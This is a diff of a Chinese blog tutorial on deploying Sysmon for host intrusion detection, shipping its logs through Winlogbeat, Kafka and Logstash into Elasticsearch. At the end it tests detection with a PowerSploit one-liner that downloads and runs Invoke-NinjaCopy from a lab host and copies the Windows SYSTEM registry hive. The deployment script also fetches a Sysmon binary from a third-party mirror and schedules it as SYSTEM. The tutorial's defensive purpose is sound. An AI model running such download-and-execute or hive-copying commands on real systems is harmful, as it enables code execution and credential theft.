@@ -103,25 +103,25 @@ var _hmt = _hmt || [];
   </header>
   <div class="content">
     <h4>介绍</h4>
-<div class="highlight"><pre><span></span>https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon
-</pre></div>
+<div class="highlight"><pre><span></span><code>https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon
+</code></pre></div>
 <p>Sysmon是微软的一款免费的轻量级系统监控工具。它通过系统服务和驱动程序实现记录进程创建，网络连接以及文件创建时间更改的详细信息，并把相关的信息写入并展示在windows的日志事件里。我们可以通过读取Windows的日志，了解Windows的安全状态。</p>
 <p>Sysmon安装后分为用户态系统服务，即ring3层的exe， 驱动（Flt的minifilter）两部分，下面开始上篇的讲解，ring3实现对网络数据记录以及对驱动返回的数据进行解析，而驱动部分则返回进程相关的信息以及进程访问文件注册表的数据给ring3，我们首选讲解ring3的实现原理。用户态通过ETW(Event Tracing for Windows)实现对网络数据记录，通过EventLog对驱动返回的数据进行解析，驱动部分则通过进、线程，模块的回调函数收集进程相关的信息，通过Minifilter文件过滤驱动和注册表回调函数记录访问文件、注册表的数据。</p>
 <p>从功能上来讲，Sysmon是一款优秀的HIDS、EDR的主机入侵检测引擎，其依托于Windows内核层进、线程，模块，注册表回调，及文件过滤驱动针对相应的行为进行实时的增、删、改信息收集并通过ETW存储并展示于Windows日志。</p>
 <h4>安装</h4>
 <p>下载地址</p>
-<div class="highlight"><pre><span></span>https://download.sysinternals.com/files/Sysmon.zip
-</pre></div>
-<div class="highlight"><pre><span></span>    Install:    Sysmon.exe -i &lt;configfile&gt;
-    <span class="o">[</span>-h &lt;<span class="o">[</span>sha1<span class="p">|</span>md5<span class="p">|</span>sha256<span class="p">|</span>imphash<span class="p">|</span>*<span class="o">]</span>,...&gt;<span class="o">]</span> <span class="o">[</span>-n <span class="o">[</span>&lt;process,...&gt;<span class="o">]]</span>
-    <span class="o">[</span>-l <span class="o">(</span>&lt;process,...&gt;<span class="o">)]</span>
+<div class="highlight"><pre><span></span><code>https://download.sysinternals.com/files/Sysmon.zip
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="w">    </span>Install:<span class="w">    </span>Sysmon.exe<span class="w"> </span>-i<span class="w"> </span>&lt;configfile&gt;
+<span class="w">    </span><span class="o">[</span>-h<span class="w"> </span>&lt;<span class="o">[</span>sha1<span class="p">|</span>md5<span class="p">|</span>sha256<span class="p">|</span>imphash<span class="p">|</span>*<span class="o">]</span>,...&gt;<span class="o">]</span><span class="w"> </span><span class="o">[</span>-n<span class="w"> </span><span class="o">[</span>&lt;process,...&gt;<span class="o">]]</span>
+<span class="w">    </span><span class="o">[</span>-l<span class="w"> </span><span class="o">(</span>&lt;process,...&gt;<span class="o">)]</span>
 
-    Configure:  Sysmon.exe -c &lt;configfile&gt;
-                  <span class="o">[</span>--<span class="p">|</span><span class="o">[</span>-h &lt;<span class="o">[</span>sha1<span class="p">|</span>md5<span class="p">|</span>sha256<span class="p">|</span>imphash<span class="p">|</span>*<span class="o">]</span>,...&gt;<span class="o">]</span> <span class="o">[</span>-n <span class="o">[</span>&lt;process,...&gt;<span class="o">]]</span>
-                   <span class="o">[</span>-l <span class="o">[</span>&lt;process,...&gt;<span class="o">]]]</span>
+<span class="w">    </span>Configure:<span class="w">  </span>Sysmon.exe<span class="w"> </span>-c<span class="w"> </span>&lt;configfile&gt;
+<span class="w">                  </span><span class="o">[</span>--<span class="p">|</span><span class="o">[</span>-h<span class="w"> </span>&lt;<span class="o">[</span>sha1<span class="p">|</span>md5<span class="p">|</span>sha256<span class="p">|</span>imphash<span class="p">|</span>*<span class="o">]</span>,...&gt;<span class="o">]</span><span class="w"> </span><span class="o">[</span>-n<span class="w"> </span><span class="o">[</span>&lt;process,...&gt;<span class="o">]]</span>
+<span class="w">                   </span><span class="o">[</span>-l<span class="w"> </span><span class="o">[</span>&lt;process,...&gt;<span class="o">]]]</span>
 
-    Uninstall:  Sysmon.exe -u
-</pre></div>
+<span class="w">    </span>Uninstall:<span class="w">  </span>Sysmon.exe<span class="w"> </span>-u
+</code></pre></div>
 <p>-c 更新或显示配置</p>
 <p>-h 指定hash记录的算法</p>
 <p>-i 安装，可用xml文件来更新配置文件</p>
@@ -136,195 +136,195 @@ var _hmt = _hmt || [];
 <p>sysmon -c xxx.xml
 注：安装需要管理员权限并重启，windows 7 或者以上，服务器系统windows server 2012 及以上。   </p>
 <p>配置样例</p>
-<div class="highlight"><pre><span></span> &lt;Sysmon <span class="nv">schemaversion</span><span class="o">=</span><span class="s2">"4.21"</span>&gt;
-&lt;!-- Capture all hashes --&gt;
-&lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt; &lt;!--哈希配置<span class="o">(</span>默认使用sha1<span class="o">)</span> --&gt;
-&lt;EventFiltering&gt; &lt;!--事件筛选--&gt;
-&lt;!-- Log all drivers except <span class="k">if</span> the signature --&gt;
-&lt;!-- contains Microsoft or Windows --&gt;
-&lt;DriverLoad <span class="nv">onmatch</span><span class="o">=</span><span class="s2">"exclude"</span>&gt; &lt;!--默认记录所有日志 除非标记 ? --&gt;
-     &lt;Signature <span class="nv">condition</span><span class="o">=</span><span class="s2">"contains"</span>&gt;microsoft&lt;/Signature&gt;
-     &lt;Signature <span class="nv">condition</span><span class="o">=</span><span class="s2">"contains"</span>&gt;windows&lt;/Signature&gt;
+<div class="highlight"><pre><span></span><code><span class="w"> </span>&lt;Sysmon<span class="w"> </span><span class="nv">schemaversion</span><span class="o">=</span><span class="s2">"4.21"</span>&gt;
+&lt;!--<span class="w"> </span>Capture<span class="w"> </span>all<span class="w"> </span>hashes<span class="w"> </span>--&gt;
+&lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt;<span class="w"> </span>&lt;!--哈希配置<span class="o">(</span>默认使用sha1<span class="o">)</span><span class="w"> </span>--&gt;
+&lt;EventFiltering&gt;<span class="w"> </span>&lt;!--事件筛选--&gt;
+&lt;!--<span class="w"> </span>Log<span class="w"> </span>all<span class="w"> </span>drivers<span class="w"> </span>except<span class="w"> </span><span class="k">if</span><span class="w"> </span>the<span class="w"> </span>signature<span class="w"> </span>--&gt;
+&lt;!--<span class="w"> </span>contains<span class="w"> </span>Microsoft<span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span>--&gt;
+&lt;DriverLoad<span class="w"> </span><span class="nv">onmatch</span><span class="o">=</span><span class="s2">"exclude"</span>&gt;<span class="w"> </span>&lt;!--默认记录所有日志<span class="w"> </span>除非标记<span class="w"> </span>?<span class="w"> </span>--&gt;
+<span class="w">     </span>&lt;Signature<span class="w"> </span><span class="nv">condition</span><span class="o">=</span><span class="s2">"contains"</span>&gt;microsoft&lt;/Signature&gt;
+<span class="w">     </span>&lt;Signature<span class="w"> </span><span class="nv">condition</span><span class="o">=</span><span class="s2">"contains"</span>&gt;windows&lt;/Signature&gt;
 &lt;/DriverLoad&gt;
-&lt;!-- Do not log process termination --&gt;
+&lt;!--<span class="w"> </span>Do<span class="w"> </span>not<span class="w"> </span>log<span class="w"> </span>process<span class="w"> </span>termination<span class="w"> </span>--&gt;
 &lt;!--不记录进程终止--&gt;
-&lt;ProcessTerminate <span class="nv">onmatch</span><span class="o">=</span><span class="s2">"include"</span> /&gt;
-&lt;!-- Log network connection <span class="k">if</span> the destination port equal <span class="m">443</span> --&gt;
-&lt;!-- or <span class="m">80</span>, and process isn<span class="err">'</span>t InternetExplorer --&gt;
-&lt;NetworkConnect <span class="nv">onmatch</span><span class="o">=</span><span class="s2">"include"</span>&gt;
-     &lt;DestinationPort&gt;443&lt;/DestinationPort&gt; &lt;!-- 记录443 端口连接记录--&gt;
-     &lt;DestinationPort&gt;80&lt;/DestinationPort&gt;
+&lt;ProcessTerminate<span class="w"> </span><span class="nv">onmatch</span><span class="o">=</span><span class="s2">"include"</span><span class="w"> </span>/&gt;
+&lt;!--<span class="w"> </span>Log<span class="w"> </span>network<span class="w"> </span>connection<span class="w"> </span><span class="k">if</span><span class="w"> </span>the<span class="w"> </span>destination<span class="w"> </span>port<span class="w"> </span>equal<span class="w"> </span><span class="m">443</span><span class="w"> </span>--&gt;
+&lt;!--<span class="w"> </span>or<span class="w"> </span><span class="m">80</span>,<span class="w"> </span>and<span class="w"> </span>process<span class="w"> </span>isn<span class="err">'</span>t<span class="w"> </span>InternetExplorer<span class="w"> </span>--&gt;
+&lt;NetworkConnect<span class="w"> </span><span class="nv">onmatch</span><span class="o">=</span><span class="s2">"include"</span>&gt;
+<span class="w">     </span>&lt;DestinationPort&gt;443&lt;/DestinationPort&gt;<span class="w"> </span>&lt;!--<span class="w"> </span>记录443<span class="w"> </span>端口连接记录--&gt;
+<span class="w">     </span>&lt;DestinationPort&gt;80&lt;/DestinationPort&gt;
 &lt;/NetworkConnect&gt;
-&lt;NetworkConnect <span class="nv">onmatch</span><span class="o">=</span><span class="s2">"exclude"</span>&gt;
-     &lt;Image <span class="nv">condition</span><span class="o">=</span><span class="s2">"end with"</span>&gt;iexplore.exe&lt;/Image&gt;
+&lt;NetworkConnect<span class="w"> </span><span class="nv">onmatch</span><span class="o">=</span><span class="s2">"exclude"</span>&gt;
+<span class="w">     </span>&lt;Image<span class="w"> </span><span class="nv">condition</span><span class="o">=</span><span class="s2">"end with"</span>&gt;iexplore.exe&lt;/Image&gt;
 &lt;/NetworkConnect&gt;
 &lt;/EventFiltering&gt;
 &lt;/Sysmon&gt;
- -- 配置条目直接位于Sysmon 标签下, 过滤器位于 EventFiltering 标签下 
-</pre></div>
+<span class="w"> </span>--<span class="w"> </span>配置条目直接位于Sysmon<span class="w"> </span>标签下,<span class="w"> </span>过滤器位于<span class="w"> </span>EventFiltering<span class="w"> </span>标签下<span class="w"> </span>
+</code></pre></div>
 <p>一些配置规则</p>
-<div class="highlight"><pre><span></span> https://github.com/sametsazak/sysmon.git
+<div class="highlight"><pre><span></span><code><span class="w"> </span>https://github.com/sametsazak/sysmon.git
 
- https://github.com/SwiftOnSecurity/sysmon-config
+<span class="w"> </span>https://github.com/SwiftOnSecurity/sysmon-config
 
- https://github.com/ion-storm/sysmon-config
-</pre></div>
-<div class="highlight"><pre><span></span> ProcessCreate            进程创建
- FileCreateTime           文件创建时间更改
- NetworkConnect           检测到网络连接
- ProcessTerminate         进程终止
- DriverLoad               驱动程序已加载
- ImageLoad                镜像加载
- CreateRemoteThread       已检测到创建远程线程
- RawAccessRead            检测到原始访问读取
- ProcessAccess            已访问的进程
- FileCreate               文件创建
- RegistryEvent            添加或删除注册表对象
- RegistryEvent            注册表值设置
- RegistryEvent            注册表对象已重命名
- FileCreateStreamHash     已创建文件流
- PipeEvent                管道创建
- PipeEvent                管道已连接
- WmiEvent                 检测到WmiEventFilter活动 -- WmiEventFilter activity detected
- WmiEvent                 检测到WmiEventConsumer活动 -- WmiEventConsumer activity detected
- WmiEvent                 检测到WmiEventConsumerToFilter活动 -- WmiEventConsumerToFilter activity 
- DnsQuery                 DNS查询
-</pre></div>
+<span class="w"> </span>https://github.com/ion-storm/sysmon-config
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="w"> </span>ProcessCreate<span class="w">            </span>进程创建
+<span class="w"> </span>FileCreateTime<span class="w">           </span>文件创建时间更改
+<span class="w"> </span>NetworkConnect<span class="w">           </span>检测到网络连接
+<span class="w"> </span>ProcessTerminate<span class="w">         </span>进程终止
+<span class="w"> </span>DriverLoad<span class="w">               </span>驱动程序已加载
+<span class="w"> </span>ImageLoad<span class="w">                </span>镜像加载
+<span class="w"> </span>CreateRemoteThread<span class="w">       </span>已检测到创建远程线程
+<span class="w"> </span>RawAccessRead<span class="w">            </span>检测到原始访问读取
+<span class="w"> </span>ProcessAccess<span class="w">            </span>已访问的进程
+<span class="w"> </span>FileCreate<span class="w">               </span>文件创建
+<span class="w"> </span>RegistryEvent<span class="w">            </span>添加或删除注册表对象
+<span class="w"> </span>RegistryEvent<span class="w">            </span>注册表值设置
+<span class="w"> </span>RegistryEvent<span class="w">            </span>注册表对象已重命名
+<span class="w"> </span>FileCreateStreamHash<span class="w">     </span>已创建文件流
+<span class="w"> </span>PipeEvent<span class="w">                </span>管道创建
+<span class="w"> </span>PipeEvent<span class="w">                </span>管道已连接
+<span class="w"> </span>WmiEvent<span class="w">                 </span>检测到WmiEventFilter活动<span class="w"> </span>--<span class="w"> </span>WmiEventFilter<span class="w"> </span>activity<span class="w"> </span>detected
+<span class="w"> </span>WmiEvent<span class="w">                 </span>检测到WmiEventConsumer活动<span class="w"> </span>--<span class="w"> </span>WmiEventConsumer<span class="w"> </span>activity<span class="w"> </span>detected
+<span class="w"> </span>WmiEvent<span class="w">                 </span>检测到WmiEventConsumerToFilter活动<span class="w"> </span>--<span class="w"> </span>WmiEventConsumerToFilter<span class="w"> </span>activity<span class="w"> </span>
+<span class="w"> </span>DnsQuery<span class="w">                 </span>DNS查询
+</code></pre></div>
 <p>我们可以使用 winlogbeat采集到elk，也可以使用wazuh完成数据日志采集，然后用来分析</p>
 <p>我们也可以使用一些工具辅助我们分析，如下：</p>
 <p>Sysmon View：Sysmon日志可视化工具</p>
 <p>Sysmon Shell：Sysmon配置文件生成工具</p>
 <p>Sysmon Box：Sysmon和网络捕获日志记录工具</p>
-<div class="highlight"><pre><span></span>https://github.com/nshalabi/SysmonTools
-</pre></div>
+<div class="highlight"><pre><span></span><code>https://github.com/nshalabi/SysmonTools
+</code></pre></div>
 <h4>部署</h4>
 <p>安装并且把Auto_Update.bat，自动更新加入定时任务,把相关的地址替换一下</p>
-<div class="highlight"><pre><span></span>@echo off
+<div class="highlight"><pre><span></span><code>@echo<span class="w"> </span>off
 setlocal
-<span class="nb">set</span> <span class="nv">hour</span><span class="o">=</span>%time:~0,2%
-<span class="nb">set</span> <span class="nv">minute</span><span class="o">=</span>%time:~3,2%
-<span class="nb">set</span> /A <span class="nv">minute</span><span class="o">+=</span><span class="m">2</span>
-<span class="k">if</span> %minute% GTR <span class="m">59</span> <span class="o">(</span>
- <span class="nb">set</span> /A minute-<span class="o">=</span><span class="m">60</span>
- <span class="nb">set</span> /A <span class="nv">hour</span><span class="o">+=</span><span class="m">1</span>
+<span class="nb">set</span><span class="w"> </span><span class="nv">hour</span><span class="o">=</span>%time:~0,2%
+<span class="nb">set</span><span class="w"> </span><span class="nv">minute</span><span class="o">=</span>%time:~3,2%
+<span class="nb">set</span><span class="w"> </span>/A<span class="w"> </span><span class="nv">minute</span><span class="o">+=</span><span class="m">2</span>
+<span class="k">if</span><span class="w"> </span>%minute%<span class="w"> </span>GTR<span class="w"> </span><span class="m">59</span><span class="w"> </span><span class="o">(</span>
+<span class="w"> </span><span class="nb">set</span><span class="w"> </span>/A<span class="w"> </span>minute-<span class="o">=</span><span class="m">60</span>
+<span class="w"> </span><span class="nb">set</span><span class="w"> </span>/A<span class="w"> </span><span class="nv">hour</span><span class="o">+=</span><span class="m">1</span>
 <span class="o">)</span>
-<span class="k">if</span> %hour%<span class="o">==</span><span class="m">24</span> <span class="nb">set</span> <span class="nv">hour</span><span class="o">=</span><span class="m">00</span>
-<span class="k">if</span> <span class="s2">"%hour:~0,1%"</span><span class="o">==</span><span class="s2">" "</span> <span class="nb">set</span> <span class="nv">hour</span><span class="o">=</span><span class="m">0</span>%hour:~1,1%
-<span class="k">if</span> <span class="s2">"%hour:~1,1%"</span><span class="o">==</span><span class="s2">""</span> <span class="nb">set</span> <span class="nv">hour</span><span class="o">=</span><span class="m">0</span>%hour%
-<span class="k">if</span> <span class="s2">"%minute:~1,1%"</span><span class="o">==</span><span class="s2">""</span> <span class="nb">set</span> <span class="nv">minute</span><span class="o">=</span><span class="m">0</span>%minute%
-<span class="nb">set</span> <span class="nv">tasktime</span><span class="o">=</span>%hour%:%minute%
-mkdir C:<span class="se">\w</span>indows<span class="se">\s</span>ysmon
-<span class="nb">pushd</span> <span class="s2">"C:\windows\sysmon\"</span>
+<span class="k">if</span><span class="w"> </span>%hour%<span class="o">==</span><span class="m">24</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nv">hour</span><span class="o">=</span><span class="m">00</span>
+<span class="k">if</span><span class="w"> </span><span class="s2">"%hour:~0,1%"</span><span class="o">==</span><span class="s2">" "</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nv">hour</span><span class="o">=</span><span class="m">0</span>%hour:~1,1%
+<span class="k">if</span><span class="w"> </span><span class="s2">"%hour:~1,1%"</span><span class="o">==</span><span class="s2">""</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nv">hour</span><span class="o">=</span><span class="m">0</span>%hour%
+<span class="k">if</span><span class="w"> </span><span class="s2">"%minute:~1,1%"</span><span class="o">==</span><span class="s2">""</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nv">minute</span><span class="o">=</span><span class="m">0</span>%minute%
+<span class="nb">set</span><span class="w"> </span><span class="nv">tasktime</span><span class="o">=</span>%hour%:%minute%
+mkdir<span class="w"> </span>C:<span class="se">\w</span>indows<span class="se">\s</span>ysmon
+<span class="nb">pushd</span><span class="w"> </span><span class="s2">"C:\windows\sysmon\"</span>
 <span class="s2">echo [+] Downloading Sysmon...</span>
 <span class="s2">@powershell (new-object System.Net.WebClient).DownloadFile('https://gitee.com/njcx86/sysmon-config/raw/master/Sysmon64.exe','C:\windows\sysmon\sysmon64.exe')"</span>
-<span class="nb">echo</span> <span class="o">[</span>+<span class="o">]</span> Downloading Sysmon config...
-@powershell <span class="o">(</span>new-object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'https://gitee.com/njcx86/sysmon-config/raw/master/sysmonconfig-export.xml'</span>,<span class="s1">'C:\windows\sysmon\sysmonconfig-export.xml'</span><span class="o">)</span><span class="s2">"</span>
+<span class="nb">echo</span><span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>Sysmon<span class="w"> </span>config...
+@powershell<span class="w"> </span><span class="o">(</span>new-object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'https://gitee.com/njcx86/sysmon-config/raw/master/sysmonconfig-export.xml'</span>,<span class="s1">'C:\windows\sysmon\sysmonconfig-export.xml'</span><span class="o">)</span><span class="s2">"</span>
 <span class="s2">@powershell (new-object System.Net.WebClient).DownloadFile('https://gitee.com/njcx86/sysmon-config/raw/master/Auto_Update.bat','C:\windows\sysmon\Auto_Update.bat')"</span>
-sysmon64.exe -accepteula -i sysmonconfig-export.xml
-sc failure Sysmon64 <span class="nv">actions</span><span class="o">=</span> restart/10000/restart/10000// <span class="nv">reset</span><span class="o">=</span> <span class="m">120</span>
-<span class="nb">echo</span> <span class="o">[</span>+<span class="o">]</span> Sysmon Successfully Installed!
-<span class="nb">echo</span> <span class="o">[</span>+<span class="o">]</span> Creating Auto Update Task <span class="nb">set</span> to Hourly..
-SchTasks /Create /RU SYSTEM /RL HIGHEST /SC HOURLY /TN Update_Sysmon_Rules /TR C:<span class="se">\P</span>rogramData<span class="se">\s</span>ysmon<span class="se">\A</span>uto_Update.bat /F /ST %tasktime%
-timeout /t <span class="m">10</span>
+sysmon64.exe<span class="w"> </span>-accepteula<span class="w"> </span>-i<span class="w"> </span>sysmonconfig-export.xml
+sc<span class="w"> </span>failure<span class="w"> </span>Sysmon64<span class="w"> </span><span class="nv">actions</span><span class="o">=</span><span class="w"> </span>restart/10000/restart/10000//<span class="w"> </span><span class="nv">reset</span><span class="o">=</span><span class="w"> </span><span class="m">120</span>
+<span class="nb">echo</span><span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Sysmon<span class="w"> </span>Successfully<span class="w"> </span>Installed!
+<span class="nb">echo</span><span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>Auto<span class="w"> </span>Update<span class="w"> </span>Task<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span>Hourly..
+SchTasks<span class="w"> </span>/Create<span class="w"> </span>/RU<span class="w"> </span>SYSTEM<span class="w"> </span>/RL<span class="w"> </span>HIGHEST<span class="w"> </span>/SC<span class="w"> </span>HOURLY<span class="w"> </span>/TN<span class="w"> </span>Update_Sysmon_Rules<span class="w"> </span>/TR<span class="w"> </span>C:<span class="se">\P</span>rogramData<span class="se">\s</span>ysmon<span class="se">\A</span>uto_Update.bat<span class="w"> </span>/F<span class="w"> </span>/ST<span class="w"> </span>%tasktime%
+timeout<span class="w"> </span>/t<span class="w"> </span><span class="m">10</span>
 <span class="nb">exit</span>
-</pre></div>
+</code></pre></div>
 <p>Auto_Update.bat</p>
-<div class="highlight"><pre><span></span>@echo on
-<span class="nb">cd</span> C:<span class="se">\P</span>rogramData<span class="se">\s</span>ysmon<span class="se">\</span>
-@powershell <span class="o">(</span>new-object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'https://gitee.com/njcx86/sysmon-config/raw/master/sysmonconfig-export.xml'</span>,<span class="s1">'C:\windows\sysmon\sysmonconfig-export.xml'</span><span class="o">)</span><span class="s2">"</span>
+<div class="highlight"><pre><span></span><code>@echo<span class="w"> </span>on
+<span class="nb">cd</span><span class="w"> </span>C:<span class="se">\P</span>rogramData<span class="se">\s</span>ysmon<span class="se">\</span>
+@powershell<span class="w"> </span><span class="o">(</span>new-object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'https://gitee.com/njcx86/sysmon-config/raw/master/sysmonconfig-export.xml'</span>,<span class="s1">'C:\windows\sysmon\sysmonconfig-export.xml'</span><span class="o">)</span><span class="s2">"</span>
 <span class="s2">sysmon64 -c sysmonconfig-export.xml</span>
 <span class="s2">exit</span>
-</pre></div>
+</code></pre></div>
 <p>sysmon 安装完成后，可以看到对应的Sysmon服务</p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG74.jpeg"/></p>
 <p>sysmon 的日志位于，C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx</p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG76.jpeg"/></p>
 <p>然后安装 Winlogbeat</p>
-<div class="highlight"><pre><span></span>https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-7.8.0-windows-x86_64.zip
-</pre></div>
+<div class="highlight"><pre><span></span><code>https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-7.8.0-windows-x86_64.zip
+</code></pre></div>
 <p>配置文件的output 改为：</p>
-<div class="highlight"><pre><span></span>output.kafka:
-  # initial brokers for reading cluster metadata
-  hosts: ["172.21.129.2:9092"]
-  topic: 'win-hids'
-  
-  
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="nv">output</span>.<span class="nv">kafka</span>:
+<span class="w">  </span>#<span class="w"> </span><span class="nv">initial</span><span class="w"> </span><span class="nv">brokers</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">reading</span><span class="w"> </span><span class="nv">cluster</span><span class="w"> </span><span class="nv">metadata</span>
+<span class="w">  </span><span class="nv">hosts</span>:<span class="w"> </span>[<span class="s2">"172.21.129.2:9092"</span>]
+<span class="w">  </span><span class="nv">topic</span>:<span class="w"> </span><span class="s1">'win-hids'</span>
+<span class="w">  </span>
+<span class="w">  </span>
+</code></pre></div>
 <p>接下来就是启动了，用管理员的身份启动wPowerShell 。</p>
 <p>输入如下：</p>
-<div class="highlight"><pre><span></span>.<span class="se">\i</span>nstall-service-winlogbeat.ps1
-net start winlogbeat
-</pre></div>
+<div class="highlight"><pre><span></span><code>.<span class="se">\i</span>nstall-service-winlogbeat.ps1
+net<span class="w"> </span>start<span class="w"> </span>winlogbeat
+</code></pre></div>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG78.jpeg"/></p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG79.jpeg"/></p>
-<div class="highlight"><pre><span></span>./kafka-console-consumer.sh --bootstrap-server <span class="m">172</span>.21.129.2:9092 --topic win-hids 
-</pre></div>
+<div class="highlight"><pre><span></span><code>./kafka-console-consumer.sh<span class="w"> </span>--bootstrap-server<span class="w"> </span><span class="m">172</span>.21.129.2:9092<span class="w"> </span>--topic<span class="w"> </span>win-hids<span class="w"> </span>
+</code></pre></div>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG80.jpeg"/></p>
 <p>kafka的流量分流，写es 和 规则引擎消费， 下面是logstash to es的配置</p>
-<div class="highlight"><pre><span></span>input<span class="o">{</span>
-  kafka<span class="o">{</span>
-    <span class="nv">bootstrap_servers</span> <span class="o">=</span>&gt; <span class="s2">"172.21.129.2:9092"</span>
-    <span class="nv">topics_pattern</span>  <span class="o">=</span>&gt; <span class="s2">".*"</span>
-    <span class="nv">consumer_threads</span> <span class="o">=</span>&gt; <span class="m">5</span>
-    <span class="nv">decorate_events</span> <span class="o">=</span>&gt; <span class="nb">true</span>
-    <span class="nv">codec</span> <span class="o">=</span>&gt; <span class="s2">"json"</span>
-    <span class="nv">auto_offset_reset</span> <span class="o">=</span>&gt; <span class="s2">"latest"</span>
-    <span class="nv">group_id</span> <span class="o">=</span>&gt; <span class="s2">"logstash1"</span>
+<div class="highlight"><pre><span></span><code>input<span class="o">{</span>
+<span class="w">  </span>kafka<span class="o">{</span>
+<span class="w">    </span><span class="nv">bootstrap_servers</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="s2">"172.21.129.2:9092"</span>
+<span class="w">    </span><span class="nv">topics_pattern</span><span class="w">  </span><span class="o">=</span>&gt;<span class="w"> </span><span class="s2">".*"</span>
+<span class="w">    </span><span class="nv">consumer_threads</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">5</span>
+<span class="w">    </span><span class="nv">decorate_events</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="nb">true</span>
+<span class="w">    </span><span class="nv">codec</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="s2">"json"</span>
+<span class="w">    </span><span class="nv">auto_offset_reset</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="s2">"latest"</span>
+<span class="w">    </span><span class="nv">group_id</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="s2">"logstash1"</span>
 
 <span class="o">}</span>
 <span class="o">}</span>
-filter <span class="o">{</span>
+filter<span class="w"> </span><span class="o">{</span>
 
-        mutate <span class="o">{</span>
-        <span class="nv">remove_field</span> <span class="o">=</span>&gt; <span class="o">[</span><span class="s2">"beat"</span>,<span class="s2">"agent"</span>,<span class="s2">"ecs"</span><span class="o">]</span>
-    <span class="o">}</span>
-
-<span class="o">}</span>
-
-output <span class="o">{</span>
-   elasticsearch <span class="o">{</span>
-         <span class="nv">hosts</span> <span class="o">=</span>&gt; <span class="o">[</span><span class="s2">"127.0.0.1:9200"</span><span class="o">]</span>
-
-         <span class="nv">index</span> <span class="o">=</span>&gt; <span class="s2">"%{[@metadata][kafka][topic]}-%{+YYYY.MM.dd}"</span>
-<span class="o">}</span>
+<span class="w">        </span>mutate<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="nv">remove_field</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">[</span><span class="s2">"beat"</span>,<span class="s2">"agent"</span>,<span class="s2">"ecs"</span><span class="o">]</span>
+<span class="w">    </span><span class="o">}</span>
 
 <span class="o">}</span>
-</pre></div>
+
+output<span class="w"> </span><span class="o">{</span>
+<span class="w">   </span>elasticsearch<span class="w"> </span><span class="o">{</span>
+<span class="w">         </span><span class="nv">hosts</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">[</span><span class="s2">"127.0.0.1:9200"</span><span class="o">]</span>
+
+<span class="w">         </span><span class="nv">index</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="s2">"%{[@metadata][kafka][topic]}-%{+YYYY.MM.dd}"</span>
+<span class="o">}</span>
+
+<span class="o">}</span>
+</code></pre></div>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG81.jpeg"/></p>
 <p>我们使用 PowerSploit 干一下</p>
-<div class="highlight"><pre><span></span>https://github.com/mattifestation/PowerSploit.git
-</pre></div>
+<div class="highlight"><pre><span></span><code>https://github.com/mattifestation/PowerSploit.git
+</code></pre></div>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG83.jpeg"/></p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG84.jpeg"/></p>
-<div class="highlight"><pre><span></span>powershell IEX <span class="o">(</span>New-Object System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://172.16.251.133/Exfiltration/Invoke-NinjaCopy.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>Invoke-NinjaCopy  -Path   C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM -LocalDestination .<span class="se">\s</span>ystem.hive
+<div class="highlight"><pre><span></span><code>powershell<span class="w"> </span>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://172.16.251.133/Exfiltration/Invoke-NinjaCopy.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>Invoke-NinjaCopy<span class="w">  </span>-Path<span class="w">   </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM<span class="w"> </span>-LocalDestination<span class="w"> </span>.<span class="se">\s</span>ystem.hive
 
